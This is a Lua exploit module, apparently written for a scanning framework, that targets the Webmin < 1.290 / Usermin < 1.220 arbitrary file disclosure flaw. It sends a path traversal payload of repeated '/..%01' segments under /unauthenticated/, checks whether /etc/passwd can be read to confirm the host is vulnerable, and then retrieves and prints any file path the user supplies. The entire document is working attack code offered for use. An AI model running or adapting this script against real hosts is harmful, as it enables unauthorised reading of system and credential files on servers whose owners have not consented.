local http = require("http")
local regex = require("regexp")
local client = http.client()



-- Metadata
METADATA = {
    AUTHOR = {"farinap5 <farinap5@protonmail.com>"},
    VERSION = "1.0",
    TAGS = {"webmin","http","lfi"},
    INFO = [[Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure. 
webmin exploit]]
}

-- Arguments/Variables needed to execute script
VARS = {
    RHOST = {VALUE="example.com", NEEDED="yes", DESCRIPT="Remote Host"},
    RPORT = {VALUE="10000", NEEDED="no", DESCRIPT="Remote Port"},
    RPATH = {VALUE="/etc/passwd", NEEDED="no", DESCRIPT="Remote Path"},
}

function Init()
    Meta(METADATA) -- Load metadata 
    LoadVars(VARS) -- Load variables
end

function get_file(file)
    local aux = string.rep("/..%01", 30)
    local payload = "/unauthenticated/" .. aux .. file
    local request = http.request("GET", "http://" .. VARS.RHOST.VALUE .. ":" .. VARS.RPORT.VALUE .. payload)
    return client:do_request(request)
end

function Main()
    local result, err = get_file("/etc/passwd")
    if err then
        PrintErrln(err)
        return
    end
    
    local m, err = regex.match("root:[x*]:0:0:", result.body)
    if err then
        PrintErrln(err)
        return
    end

    if m == true then
        PrintSuccsln("host vulnerable to webmin arbitrary file disclosure")
    else
        if VARS.VERBOSE.VALUE == "true" then
            PrintErrln("not vulnerable to webmin arbitrary file disclosure")
        end
        return
    end

    result, err = get_file(VARS.RPATH.VALUE)
    if err then
        PrintErrln(err)
        return
    end
    PrintSuccsln(result.code)
    PrintSuccsln("content of " .. VARS.RPATH.VALUE .. "\n" .. result.body)
end
